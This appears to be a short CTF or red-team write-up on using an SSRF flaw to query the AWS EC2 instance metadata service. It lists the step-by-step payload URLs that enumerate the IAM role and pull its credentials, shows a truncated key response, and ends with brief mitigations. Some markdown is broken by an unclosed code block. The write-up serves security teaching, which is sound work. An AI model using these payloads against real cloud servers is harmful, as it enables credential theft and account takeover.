---
title: "AWS EC2 Exploitation: Stealing IAM Credentials"
date: 2025-12-27 12:00:00 +0200
categories: [Cloud Security, AWS]
tags: [ctf, ssrf, aws, ec2, red-teaming]
---

## Introduction

Server-Side Request Forgery (SSRF) is a critical vulnerability. In this write-up, I exploit an SSRF on AWS EC2 to access the **Instance Metadata Service**.

## Phase 1: Reconnaissance

I found a URL input and tested it with the AWS Magic IP.

**Payload Used:**
`http://169.254.169.254/latest/meta-data/`

The server responded with the directory listing, confirming **IMDSv1**.

## Phase 2: Exploitation

### 1. Get Instance ID
I requested this URL:
`http://169.254.169.254/latest/meta-data/instance-id`

### 2. Steal IAM Credentials
I enumerated the role name first:
`http://169.254.169.254/latest/meta-data/iam/security-credentials/`

**Role Name:** `ec2-prod-role`

Then I extracted the keys using this final payload:

```text
[http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role](http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-prod-role)
Phase 3: Exfiltration
Response containing the keys:


{
  "Code" : "Success",
  "AccessKeyId" : "ASIAQ3EGUZ...",
  "SecretAccessKey" : "EBvAKCmU..."
}
Mitigation
Enforce IMDSv2.

Whitelist allowed domains.
